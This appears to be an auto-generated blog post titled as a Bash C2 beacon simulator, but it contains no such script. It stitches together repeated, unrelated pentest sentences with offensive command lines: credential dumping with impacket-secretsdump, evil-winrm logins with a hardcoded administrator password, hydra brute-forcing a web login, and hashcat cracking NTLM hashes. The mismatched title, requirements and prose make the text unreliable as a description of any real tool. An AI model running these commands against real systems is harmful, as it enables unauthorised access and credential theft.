---
TitleSEO: "C2 Beacon Simulator in Bash | ZureFX"
TitlePost: "C2 Beacon Simulator — Bash"
Author: "ZureFX"
Description: "A Bash script for c2 beacon simulator. Built for security research and automation."
Keywords: "c, tool, powershell, python, bash"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-704.html"
URL_IMAGES: ""
Date: "2025-10-09"
Tags: "C, Tool, PowerShell, Python, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-704"
Permalink: "/scripting/script-c2-beacon-simulator-704.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `evil-winrm`
- `sharphound`
- `atexec`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.19.219.247
```

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
feroxbuster -h
```

## Usage

### Basic Usage

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.15.144 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.75.144.46 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.18.241.74 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.251.190 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p135,389,5986 10.44.134.183 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 5.91s
```
